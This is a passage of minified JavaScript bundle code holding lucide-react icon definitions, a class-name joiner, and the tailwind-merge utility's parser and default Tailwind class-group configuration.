  ["path", {
    d: "M3 12h.01",
    key: "nlz23k"
  }],
  ["path", {
    d: "M12 3h.01",
    key: "n36tog"
  }],
  ["path", {
    d: "M12 16v.01",
    key: "133mhm"
  }],
  ["path", {
    d: "M16 12h1",
    key: "1slzba"
  }],
  ["path", {
    d: "M21 12v.01",
    key: "1lwtk9"
  }],
  ["path", {
    d: "M12 21v-1",
    key: "1880an"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Qm = Ft("TriangleAlert", [
  ["path", {
    d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
    key: "wmoenq"
  }],
  ["path", {
    d: "M12 9v4",
    key: "juzpu7"
  }],
  ["path", {
    d: "M12 17h.01",
    key: "p32p05"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const EC = Ft("Upload", [
  ["path", {
    d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",
    key: "ih7n3h"
  }],
  ["polyline", {
    points: "17 8 12 3 7 8",
    key: "t8dd8p"
  }],
  ["line", {
    x1: "12",
    x2: "12",
    y1: "3",
    y2: "15",
    key: "widbto"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const TC = Ft("X", [
  ["path", {
    d: "M18 6 6 18",
    key: "1bl5f8"
  }],
  ["path", {
    d: "m6 6 12 12",
    key: "d8bk6v"
  }]
]);

function $v(e) {
  var t, n, r = "";
  if (typeof e == "string" || typeof e == "number") r += e;
  else if (typeof e == "object")
    if (Array.isArray(e)) {
      var s = e.length;
      for (t = 0; t < s; t++) e[t] && (n = $v(e[t])) && (r && (r += " "), r += n)
    } else
      for (n in e) e[n] && (r && (r += " "), r += n);
  return r
}

function kC() {
  for (var e, t, n = 0, r = "", s = arguments.length; n < s; n++)(e = arguments[n]) && (t = $v(e)) && (r && (r += " "), r += t);
  return r
}
const Ef = "-",
  RC = e => {
    const t = MC(e),
      {
        conflictingClassGroups: n,
        conflictingClassGroupModifiers: r
      } = e;
    return {
      getClassGroupId: i => {
        const a = i.split(Ef);
        return a[0] === "" && a.length !== 1 && a.shift(), Hv(a, t) || DC(i)
      },
      getConflictingClassGroupIds: (i, a) => {
        const c = n[i] || [];
        return a && r[i] ? [...c, ...r[i]] : c
      }
    }
  },
  Hv = (e, t) => {
    var i;
    if (e.length === 0) return t.classGroupId;
    const n = e[0],
      r = t.nextPart.get(n),
      s = r ? Hv(e.slice(1), r) : void 0;
    if (s) return s;
    if (t.validators.length === 0) return;
    const o = e.join(Ef);
    return (i = t.validators.find(({
      validator: a
    }) => a(o))) == null ? void 0 : i.classGroupId
  },
  Gm = /^\[(.+)\]$/,
  DC = e => {
    if (Gm.test(e)) {
      const t = Gm.exec(e)[1],
        n = t == null ? void 0 : t.substring(0, t.indexOf(":"));
      if (n) return "arbitrary.." + n
    }
  },
  MC = e => {
    const {
      theme: t,
      prefix: n
    } = e, r = {
      nextPart: new Map,
      validators: []
    };
    return IC(Object.entries(e.classGroups), n).forEach(([o, i]) => {
      sd(i, r, o, t)
    }), r
  },
  sd = (e, t, n, r) => {
    e.forEach(s => {
      if (typeof s == "string") {
        const o = s === "" ? t : qm(t, s);
        o.classGroupId = n;
        return
      }
      if (typeof s == "function") {
        if (_C(s)) {
          sd(s(r), t, n, r);
          return
        }
        t.validators.push({
          validator: s,
          classGroupId: n
        });
        return
      }
      Object.entries(s).forEach(([o, i]) => {
        sd(i, qm(t, o), n, r)
      })
    })
  },
  qm = (e, t) => {
    let n = e;
    return t.split(Ef).forEach(r => {
      n.nextPart.has(r) || n.nextPart.set(r, {
        nextPart: new Map,
        validators: []
      }), n = n.nextPart.get(r)
    }), n
  },
  _C = e => e.isThemeGetter,
  IC = (e, t) => t ? e.map(([n, r]) => {
    const s = r.map(o => typeof o == "string" ? t + o : typeof o == "object" ? Object.fromEntries(Object.entries(o).map(([i, a]) => [t + i, a])) : o);
    return [n, s]
  }) : e,
  LC = e => {
    if (e < 1) return {
      get: () => { },
      set: () => { }
    };
    let t = 0,
      n = new Map,
      r = new Map;
    const s = (o, i) => {
      n.set(o, i), t++, t > e && (t = 0, r = n, n = new Map)
    };
    return {
      get(o) {
        let i = n.get(o);
        if (i !== void 0) return i;
        if ((i = r.get(o)) !== void 0) return s(o, i), i
      },
      set(o, i) {
        n.has(o) ? n.set(o, i) : s(o, i)
      }
    }
  },
  Wv = "!",
  OC = e => {
    const {
      separator: t,
      experimentalParseClassName: n
    } = e, r = t.length === 1, s = t[0], o = t.length, i = a => {
      const c = [];
      let u = 0,
        d = 0,
        f;
      for (let S = 0; S < a.length; S++) {
        let g = a[S];
        if (u === 0) {
          if (g === s && (r || a.slice(S, S + o) === t)) {
            c.push(a.slice(d, S)), d = S + o;
            continue
          }
          if (g === "/") {
            f = S;
            continue
          }
        }
        g === "[" ? u++ : g === "]" && u--
      }
      const h = c.length === 0 ? a : a.substring(d),
        y = h.startsWith(Wv),
        w = y ? h.substring(1) : h,
        v = f && f > d ? f - d : void 0;
      return {
        modifiers: c,
        hasImportantModifier: y,
        baseClassName: w,
        maybePostfixModifierPosition: v
      }
    };
    return n ? a => n({
      className: a,
      parseClassName: i
    }) : i
  },
  FC = e => {
    if (e.length <= 1) return e;
    const t = [];
    let n = [];
    return e.forEach(r => {
      r[0] === "[" ? (t.push(...n.sort(), r), n = []) : n.push(r)
    }), t.push(...n.sort()), t
  },
  VC = e => ({
    cache: LC(e.cacheSize),
    parseClassName: OC(e),
    ...RC(e)
  }),
  BC = /\s+/,
  zC = (e, t) => {
    const {
      parseClassName: n,
      getClassGroupId: r,
      getConflictingClassGroupIds: s
    } = t, o = [], i = e.trim().split(BC);
    let a = "";
    for (let c = i.length - 1; c >= 0; c -= 1) {
      const u = i[c],
        {
          modifiers: d,
          hasImportantModifier: f,
          baseClassName: h,
          maybePostfixModifierPosition: y
        } = n(u);
      let w = !!y,
        v = r(w ? h.substring(0, y) : h);
      if (!v) {
        if (!w) {
          a = u + (a.length > 0 ? " " + a : a);
          continue
        }
        if (v = r(h), !v) {
          a = u + (a.length > 0 ? " " + a : a);
          continue
        }
        w = !1
      }
      const S = FC(d).join(":"),
        g = f ? S + Wv : S,
        p = g + v;
      if (o.includes(p)) continue;
      o.push(p);
      const m = s(v, w);
      for (let b = 0; b < m.length; ++b) {
        const C = m[b];
        o.push(g + C)
      }
      a = u + (a.length > 0 ? " " + a : a)
    }
    return a
  };

function UC() {
  let e = 0,
    t, n, r = "";
  for (; e < arguments.length;)(t = arguments[e++]) && (n = Kv(t)) && (r && (r += " "), r += n);
  return r
}
const Kv = e => {
  if (typeof e == "string") return e;
  let t, n = "";
  for (let r = 0; r < e.length; r++) e[r] && (t = Kv(e[r])) && (n && (n += " "), n += t);
  return n
};

function $C(e, ...t) {
  let n, r, s, o = i;

  function i(c) {
    const u = t.reduce((d, f) => f(d), e());
    return n = VC(u), r = n.cache.get, s = n.cache.set, o = a, a(c)
  }

  function a(c) {
    const u = r(c);
    if (u) return u;
    const d = zC(c, n);
    return s(c, d), d
  }
  return function () {
    return o(UC.apply(null, arguments))
  }
}
const fe = e => {
  const t = n => n[e] || [];
  return t.isThemeGetter = !0, t
},
  Qv = /^\[(?:([a-z-]+):)?(.+)\]$/i,
  HC = /^\d+\/\d+$/,
  WC = new Set(["px", "full", "screen"]),
  KC = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,
  QC = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,
  GC = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,
  qC = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,
  YC = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,
  hn = e => Ns(e) || WC.has(e) || HC.test(e),
  Fn = e => Js(e, "length", sN),
  Ns = e => !!e && !Number.isNaN(Number(e)),
  _c = e => Js(e, "number", Ns),
  go = e => !!e && Number.isInteger(Number(e)),
  XC = e => e.endsWith("%") && Ns(e.slice(0, -1)),
  ee = e => Qv.test(e),
  Vn = e => KC.test(e),
  JC = new Set(["length", "size", "percentage"]),
  ZC = e => Js(e, JC, Gv),
  eN = e => Js(e, "position", Gv),
  tN = new Set(["image", "url"]),
  nN = e => Js(e, tN, iN),
  rN = e => Js(e, "", oN),
  yo = () => !0,
  Js = (e, t, n) => {
    const r = Qv.exec(e);
    return r ? r[1] ? typeof t == "string" ? r[1] === t : t.has(r[1]) : n(r[2]) : !1
  },
  sN = e => QC.test(e) && !GC.test(e),
  Gv = () => !1,
  oN = e => qC.test(e),
  iN = e => YC.test(e),
  aN = () => {
    const e = fe("colors"),
      t = fe("spacing"),
      n = fe("blur"),
      r = fe("brightness"),
      s = fe("borderColor"),
      o = fe("borderRadius"),
      i = fe("borderSpacing"),
      a = fe("borderWidth"),
      c = fe("contrast"),
      u = fe("grayscale"),
      d = fe("hueRotate"),
      f = fe("invert"),
      h = fe("gap"),
      y = fe("gradientColorStops"),
      w = fe("gradientColorStopPositions"),
      v = fe("inset"),
      S = fe("margin"),
      g = fe("opacity"),
      p = fe("padding"),
      m = fe("saturate"),
      b = fe("scale"),
      C = fe("sepia"),
      j = fe("skew"),
      A = fe("space"),
      P = fe("translate"),
      M = () => ["auto", "contain", "none"],
      _ = () => ["auto", "hidden", "clip", "visible", "scroll"],
      G = () => ["auto", ee, t],
      I = () => [ee, t],
      $ = () => ["", hn, Fn],
      U = () => ["auto", Ns, ee],
      te = () => ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top"],
      re = () => ["solid", "dashed", "dotted", "double", "none"],
      X = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"],
      D = () => ["start", "end", "center", "between", "around", "evenly", "stretch"],
      R = () => ["", "0", ee],
      L = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"],
      J = () => [Ns, ee];
    return {
      cacheSize: 500,
      separator: ":",
      theme: {
        colors: [yo],
        spacing: [hn, Fn],
        blur: ["none", "", Vn, ee],
        brightness: J(),
        borderColor: [e],
        borderRadius: ["none", "", "full", Vn, ee],
        borderSpacing: I(),
        borderWidth: $(),
        contrast: J(),
        grayscale: R(),
        hueRotate: J(),
        invert: R(),
        gap: I(),
        gradientColorStops: [e],
        gradientColorStopPositions: [XC, Fn],
        inset: G(),
        margin: G(),
        opacity: J(),
        padding: I(),
        saturate: J(),
        scale: J(),
        sepia: R(),
        skew: J(),
        space: I(),
        translate: I()
      },
      classGroups: {
        aspect: [{
          aspect: ["auto", "square", "video", ee]
        }],
        container: ["container"],
        columns: [{
          columns: [Vn]
        }],
        "break-after": [{
          "break-after": L()
        }],
        "break-before": [{
          "break-before": L()
        }],
        "break-inside": [{
          "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
        }],
        "box-decoration": [{
          "box-decoration": ["slice", "clone"]
        }],
        box: [{
          box: ["border", "content"]
        }],
        display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
        float: [{
          float: ["right", "left", "none", "start", "end"]
        }],
        clear: [{
          clear: ["left", "right", "both", "none", "start", "end"]
        }],
        isolation: ["isolate", "isolation-auto"],
        "object-fit": [{
          object: ["contain", "cover", "fill", "none", "scale-down"]
        }],
        "object-position": [{
          object: [...te(), ee]
        }],
        overflow: [{
          overflow: _()
        }],
        "overflow-x": [{
          "overflow-x": _()
        }],
        "overflow-y": [{
          "overflow-y": _()
        }],
        overscroll: [{
          overscroll: M()
        }],
        "overscroll-x": [{
          "overscroll-x": M()
        }],
        "overscroll-y": [{
          "overscroll-y": M()
        }],
        position: ["static", "fixed", "absolute", "relative", "sticky"],
        inset: [{
          inset: [v]
        }],
        "inset-x": [{
          "inset-x": [v]
        }],
        "inset-y": [{
          "inset-y": [v]
        }],
        start: [{
          start: [v]
        }],
        end: [{
          end: [v]
        }],
        top: [{
          top: [v]
        }],
        right: [{
          right: [v]
        }],
        bottom: [{
          bottom: [v]
        }],
        left: [{
          left: [v]
        }],
        visibility: ["visible", "invisible", "collapse"],
        z: [{
          z: ["auto", go, ee]
        }],
        basis: [{
          basis: G()
        }],
        "flex-direction": [{
          flex: ["row", "row-reverse", "col", "col-reverse"]
        }],
        "flex-wrap": [{
          flex: ["wrap", "wrap-reverse", "nowrap"]
        }],
        flex: [{
          flex: ["1", "auto", "initial", "none", ee]
        }],
        grow: [{
          grow: R()
        }],
        shrink: [{
          shrink: R()
        }],
        order: [{
          order: ["first", "last", "none", go, ee]
        }],
        "grid-cols": [{
          "grid-cols": [yo]
        }],
        "col-start-end": [{
          col: ["auto", {
            span: ["full", go, ee]
          }, ee]
        }],
        "col-start": [{
          "col-start": U()
        }],
        "col-end": [{
          "col-end": U()
        }],
        "grid-rows": [{
          "grid-rows": [yo]
        }],
        "row-start-end": [{
          row: ["auto", {
            span: [go, ee]
          }, ee]
        }],
        "row-start": [{
          "row-start": U()
        }],
        "row-end": [{
          "row-end": U()
        }],
        "grid-flow": [{
          "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
        }],
        "auto-cols": [{
          "auto-cols": ["auto", "min", "max", "fr", ee]
        }],
        "auto-rows": [{
          "auto-rows": ["auto", "min", "max", "fr", ee]
        }],
        gap: [{
          gap: [h]
        }],
        "gap-x": [{
          "gap-x": [h]
        }],
        "gap-y": [{
          "gap-y": [h]
        }],
        "justify-content": [{
          justify: ["normal", ...D()]
        }],
        "justify-items": [{
          "justify-items": ["start", "end", "center", "stretch"]
        }],
        "justify-self": [{
          "justify-self": ["auto", "start", "end", "center", "stretch"]
        }],
        "align-content": [{
          content: ["normal", ...D(), "baseline"]
        }],
        "align-items": [{
          items: ["start", "end", "center", "baseline", "stretch"]
        }],
        "align-self": [{
          self: ["auto", "start", "end", "center", "stretch", "baseline"]
        }],
        "place-content": [{
          "place-content": [...D(), "baseline"]
        }],
        "place-items": [{
          "place-items": ["start", "end", "center", "baseline", "stretch"]
        }],
        "place-self": [{
          "place-self": ["auto", "start", "end", "center", "stretch"]
        }],
        p: [{
          p: [p]
        }],
        px: [{
          px: [p]
        }],
        py: [{
          py: [p]
        }],
        ps: [{
          ps: [p]
        }],
        pe: [{
          pe: [p]
        }],
        pt: [{
          pt: [p]
        }],
        pr: [{
          pr: [p]
        }],
        pb: [{
          pb: [p]
        }],
        pl: [{
          pl: [p]
        }],
        m: [{
          m: [S]
        }],
        mx: [{
          mx: [S]
        }],
        my: [{
          my: [S]
        }],
        ms: [{
          ms: [S]
        }],
        me: [{
          me: [S]
        }],
        mt: [{
          mt: [S]
        }],
        mr: [{
          mr: [S]
        }],
        mb: [{
          mb: [S]
        }],
        ml: [{
          ml: [S]
        }],
        "space-x": [{
          "space-x": [A]
        }],
        "space-x-reverse": ["space-x-reverse"],
        "space-y": [{
          "space-y": [A]
        }],
        "space-y-reverse": ["space-y-reverse"],
        w: [{
          w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", ee, t]
        }],
        "min-w": [{
          "min-w": [ee, t, "min", "max", "fit"]
        }],
        "max-w": [{
          "max-w": [ee, t, "none", "full", "min", "max", "fit", "prose", {
            screen: [Vn]
          }, Vn]
        }],
        h: [{
          h: [ee, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
        }],
        "min-h": [{
          "min-h": [ee, t, "min", "max", "fit", "svh", "lvh", "dvh"]
        }],
        "max-h": [{
          "max-h": [ee, t, "min", "max", "fit", "svh", "lvh", "dvh"]
        }],
        size: [{
          size: [ee, t, "auto", "min", "max", "fit"]
        }],
        "font-size": [{
          text: ["base", Vn, Fn]
        }],
        "font-smoothing": ["antialiased", "subpixel-antialiased"],
        "font-style": ["italic", "not-italic"],
        "font-weight": [{
          font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", _c]
        }],
        "font-family": [{
          font: [yo]
        }],
        "fvn-normal": ["normal-nums"],
        "fvn-ordinal": ["ordinal"],
        "fvn-slashed-zero": ["slashed-zero"],
        "fvn-figure": ["lining-nums", "oldstyle-nums"],
        "fvn-spacing": ["proportional-nums", "tabular-nums"],
        "fvn-fraction": ["diagonal-fractions", "stacked-fractons"],
        tracking: [{
          tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", ee]
        }],
        "line-clamp": [{
          "line-clamp": ["none", Ns, _c]
        }],
        leading: [{
          leading: ["none", "tight", "snug", "normal", "relaxed", "loose", hn, ee]
        }],
        "list-image": [{
          "list-image": ["none", ee]
        }],
        "list-style-type": [{
          list: ["none", "disc", "decimal", ee]
        }],
        "list-style-position": [{
          list: ["inside", "outside"]
        }],
        "placeholder-color": [{
          placeholder: [e]
        }],
        "placeholder-opacity": [{
          "placeholder-opacity": [g]
        }],
        "text-alignment": [{
          text: ["left", "center", "right", "justify", "start", "end"]
        }],
        "text-color": [{
          text: [e]
        }],
        "text-opacity": [{
          "text-opacity": [g]
        }],
        "text-decoration": ["underline", "overline", "line-through", "no-underline"],
        "text-decoration-style": [{
          decoration: [...re(), "wavy"]
        }],
        "text-decoration-thickness": [{
          decoration: ["auto", "from-font", hn, Fn]
        }],
        "underline-offset": [{
          "underline-offset": ["auto", hn, ee]
        }],
        "text-decoration-color": [{
          decoration: [e]
        }],
        "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
        "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
        "text-wrap": [{
          text: ["wrap", "nowrap", "balance", "pretty"]
        }],
        indent: [{
          indent: I()
        }],
        "vertical-align": [{
          align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", ee]
        }],
        whitespace: [{
          whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
        }],
        break: [{
          break: ["normal", "words", "all", "keep"]
        }],
        hyphens: [{
          hyphens: ["none", "manual", "auto"]
        }],
        content: [{
          content: ["none", ee]
        }],
        "bg-attachment": [{
          bg: ["fixed", "local", "scroll"]
        }],
        "bg-clip": [{
          "bg-clip": ["border", "padding", "content", "text"]
        }],
        "bg-opacity": [{
          "bg-opacity": [g]
        }],
        "bg-origin": [{
          "bg-origin": ["border", "padding", "content"]
        }],
        "bg-position": [{
          bg: [...te(), eN]
        }],
        "bg-repeat": [{
          bg: ["no-repeat", {
            repeat: ["", "x", "y", "round", "space"]
          }]
        }],
        "bg-size": [{
          bg: ["auto", "cover", "contain", ZC]
        }],
        "bg-image": [{
          bg: ["none", {
            "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
          }, nN]
        }],
        "bg-color": [{
          bg: [e]
        }],
        "gradient-from-pos": [{
          from: [w]
        }],
        "gradient-via-pos": [{
          via: [w]
        }],
        "gradient-to-pos": [{
          to: [w]
        }],
        "gradient-from": [{
          from: [y]
        }],
        "gradient-via": [{
          via: [y]
        }],
        "gradient-to": [{
          to: [y]
        }],
        rounded: [{
          rounded: [o]
        }],
        "rounded-s": [{
          "rounded-s": [o]
        }],
        "rounded-e": [{
          "rounded-e": [o]
        }],
        "rounded-t": [{
          "rounded-t": [o]
        }],
        "rounded-r": [{
          "rounded-r": [o]
        }],
        "rounded-b": [{
          "rounded-b": [o]
        }],
        "rounded-l": [{
          "rounded-l": [o]
        }],
        "rounded-ss": [{
          "rounded-ss": [o]
        }],
        "rounded-se": [{
          "rounded-se": [o]
        }],
        "rounded-ee": [{
          "rounded-ee": [o]
        }],
        "rounded-es": [{
          "rounded-es": [o]
        }],
        "rounded-tl": [{
          "rounded-tl": [o]
        }],
        "rounded-tr": [{
          "rounded-tr": [o]
        }],
        "rounded-br": [{
          "rounded-br": [o]
        }],
        "rounded-bl": [{
          "rounded-bl": [o]
        }],
        "border-w": [{
          border: [a]
        }],
        "border-w-x": [{
          "border-x": [a]
        }],
        "border-w-y": [{
          "border-y": [a]
        }],
        "border-w-s": [{
          "border-s": [a]
        }],
        "border-w-e": [{
          "border-e": [a]
        }],
        "border-w-t": [{
          "border-t": [a]
        }],
        "border-w-r": [{
          "border-r": [a]
        }],
        "border-w-b": [{
          "border-b": [a]
        }],
        "border-w-l": [{
          "border-l": [a]
        }],
        "border-opacity": [{
          "border-opacity": [g]
        }],
        "border-style": [{
          border: [...re(), "hidden"]
        }],
        "divide-x": [{
          "divide-x": [a]
        }],
        "divide-x-reverse": ["divide-x-reverse"],
        "divide-y": [{
          "divide-y": [a]
        }],
        "divide-y-reverse": ["divide-y-reverse"],
        "divide-opacity": [{
          "divide-opacity": [g]
        }],
        "divide-style": [{
          divide: re()
        }],
        "border-color": [{
          border: [s]
        }],
        "border-color-x": [{
          "border-x": [s]
        }],
        "border-color-y": [{
          "border-y": [s]
        }],
        "border-color-s": [{
          "border-s": [s]
        }],
        "border-color-e": [{
          "border-e": [s]
        }],
        "border-color-t": [{
          "border-t": [s]
        }],
        "border-color-r": [{
          "border-r": [s]
        }],
        "border-color-b": [{
          "border-b": [s]
        }],
        "border-color-l": [{
          "border-l": [s]
        }],
        "divide-color": [{
          divide: [s]
        }],
        "outline-style": [{
          outline: ["", ...re()]
        }],
        "outline-offset": [{
          "outline-offset": [hn, ee]
        }],
        "outline-w": [{
          outline: [hn, Fn]
        }],
        "outline-color": [{
          outline: [e]
        }],
        "ring-w": [{
          ring: $()
        }],
        "ring-w-inset": ["ring-inset"],
        "ring-color": [{
          ring: [e]
        }],
        "ring-opacity": [{
          "ring-opacity": [g]
        }],
        "ring-offset-w": [{
          "ring-offset": [hn, Fn]
        }],
        "ring-offset-color": [{
          "ring-offset": [e]
        }],
        shadow: [{
          shadow: ["", "inner", "none", Vn, rN]
        }],
        "shadow-color": [{
          shadow: [yo]
        }],
        opacity: [{
          opacity: [g]
        }],
        "mix-blend": [{
          "mix-blend": [...X(), "plus-lighter", "plus-darker"]
        }],
        "bg-blend": [{
          "bg-blend": X()
        }],
        filter: [{
          filter: ["", "none"]
        }],
        blur: [{
          blur: [n]
        }],
        brightness: [{
          brightness: [r]
        }],
        contrast: [{
          contrast: [c]
        }],
        "drop-shadow": [{
          "drop-shadow": ["", "none", Vn, ee]
        }],
        grayscale: [{
          grayscale: [u]
        }],
        "hue-rotate": [{
          "hue-rotate": [d]
        }],
        invert: [{
          invert: [f]
        }],
        saturate: [{
          saturate: [m]
        }],
        sepia: [{
          sepia: [C]
        }],
        "backdrop-filter": [{
          "backdrop-filter": ["", "none"]
        }],
        "backdrop-blur": [{
          "backdrop-blur": [n]
        }],
        "backdrop-brightness": [{
          "backdrop-brightness": [r]
        }],
        "backdrop-contrast": [{
          "backdrop-contrast": [c]
        }],
        "backdrop-grayscale": [{
          "backdrop-grayscale": [u]
        }],
        "backdrop-hue-rotate": [{
          "backdrop-hue-rotate": [d]
        }],
        "backdrop-invert": [{
          "backdrop-invert": [f]
        }],
        "backdrop-opacity": [{
          "backdrop-opacity": [g]
        }],
        "backdrop-saturate": [{
          "backdrop-saturate": [m]
        }],
        "backdrop-sepia": [{
          "backdrop-sepia": [C]
        }],
        "border-collapse": [{
          border: ["collapse", "separate"]
        }],
        "border-spacing": [{
          "border-spacing": [i]
        }],
        "border-spacing-x": [{
          "border-spacing-x": [i]
        }],
        "border-spacing-y": [{
          "border-spacing-y": [i]
        }],
        "table-layout": [{
          table: ["auto", "fixed"]
        }],
        caption: [{
          caption: ["top", "bottom"]
        }],
        transition: [{
          transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", ee]
        }],
        duration: [{
          duration: J()
        }],
        ease: [{
          ease: ["linear", "in", "out", "in-out", ee]
        }],
        delay: [{
          delay: J()
        }],
        animate: [{
          animate: ["none", "spin", "ping", "pulse", "bounce", ee]
        }],
        transform: [{
          transform: ["", "gpu", "none"]
        }],
        scale: [{
          scale: [b]
        }],
        "scale-x": [{
          "scale-x": [b]
        }],
        "scale-y": [{
          "scale-y": [b]
        }],
        rotate: [{
          rotate: [go, ee]
        }],
        "translate-x": [{
          "translate-x": [P]
        }],
        "translate-y": [{
          "translate-y": [P]
        }],
        "skew-x": [{
          "skew-x": [j]
        }],
        "skew-y": [{
          "skew-y": [j]
        }],
        "transform-origin": [{
          origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", ee]
        }],
        accent: [{
          accent: ["auto", e]
        }],
        appearance: [{
          appearance: ["none", "auto"]
        }],
        cursor: [{
          cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", ee]
        }],
        "caret-color": [{
          caret: [e]
        }],
        "pointer-events": [{
          "pointer-events": ["none", "auto"]
        }],
        resize: [{
          resize: ["none", "y", "x", ""]
        }],
        "scroll-behavior": [{
          scroll: ["auto", "smooth"]
        }],
        "scroll-m": [{
          "scroll-m": I()
        }],
        "scroll-mx": [{
          "scroll-mx": I()
        }],
        "scroll-my": [{
          "scroll-my": I()
        }],
        "scroll-ms": [{
          "scroll-ms": I()
        }],
        "scroll-me": [{
          "scroll-me": I()
        }],
        "scroll-mt": [{
          "scroll-mt": I()
        }],
        "scroll-mr": [{
          "scroll-mr": I()
        }],
        "scroll-mb": [{
          "scroll-mb": I()
        }],
        "scroll-ml": [{
          "scroll-ml": I()
        }],
        "scroll-p": [{
          "scroll-p": I()
        }],
        "scroll-px": [{
          "scroll-px": I()
        }],
        "scroll-py": [{
          "scroll-py": I()
        }],
        "scroll-ps": [{
          "scroll-ps": I()
        }],
        "scroll-pe": [{
          "scroll-pe": I()
        }],
        "scroll-pt": [{
          "scroll-pt": I()
        }],
        "scroll-pr": [{
          "scroll-pr": I()
        }],
        "scroll-pb": [{
          "scroll-pb": I()
        }],
        "scroll-pl": [{
          "scroll-pl": I()
        }],
        "snap-align": [{
          snap: ["start", "end", "center", "align-none"]
        }],
        "snap-stop": [{
          snap: ["normal", "always"]
        }],
        "snap-type": [{
          snap: ["none", "x", "y", "both"]
        }],
        "snap-strictness": [{
          snap: ["mandatory", "proximity"]
        }],
        touch: [{
          touch: ["auto", "none", "manipulation"]
        }],
        "touch-x": [{
          "touch-pan": ["x", "left", "right"]
        }],
        "touch-y": [{
          "touch-pan": ["y", "up", "down"]
        }],
        "touch-pz": ["touch-pinch-zoom"],
        select: [{
          select: ["none", "text", "all", "auto"]
        }],
        "will-change": [{
          "will-change": ["auto", "scroll", "contents", "transform", ee]
        }],
        fill: [{
          fill: [e, "none"]
        }],
        "stroke-w": [{
          stroke: [hn, Fn, _c]
        }],
        stroke: [{
          stroke: [e, "none"]
        }],
        sr: ["sr-only", "not-sr-only"],
        "forced-color-adjust": [{
          "forced-color-adjust": ["auto", "none"]
        }]
      },
      conflictingClassGroups: {
        overflow: ["overflow-x", "overflow-y"],
        overscroll: ["overscroll-x", "overscroll-y"],
        inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
        "inset-x": ["right", "left"],
        "inset-y": ["top", "bottom"],
        flex: ["basis", "grow", "shrink"],
        gap: ["gap-x", "gap-y"],
        p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
        px: ["pr", "pl"],
        py: ["pt", "pb"],
        m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
        mx: ["mr", "ml"],
        my: ["mt", "mb"],
        size: ["w", "h"],
        "font-size": ["leading"],
        "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
        "fvn-ordinal": ["fvn-normal"],
        "fvn-slashed-zero": ["fvn-normal"],
        "fvn-figure": ["fvn-normal"],
        "fvn-spacing": ["fvn-normal"],
        "fvn-fraction": ["fvn-normal"],
        "line-clamp": ["display", "overflow"],
        rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
        "rounded-s": ["rounded-ss", "rounded-es"],
        "rounded-e": ["rounded-se", "rounded-ee"],
        "rounded-t": ["rounded-tl", "rounded-tr"],
        "rounded-r": ["rounded-tr", "rounded-br"],
        "rounded-b": ["rounded-br", "rounded-bl"],
        "rounded-l": ["rounded-tl", "rounded-bl"],
        "border-spacing": ["border-spacing-x", "border-spacing-y"],
        "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
        "border-w-x": ["border-w-r", "border-w-l"],
        "border-w-y": ["border-w-t", "border-w-b"],
        "border-color": ["border-color-s", "border-color-e", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
        "border-color-x": ["border-color-r", "border-color-l"],
        "border-color-y": ["border-color-t", "border-color-b"],
        "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
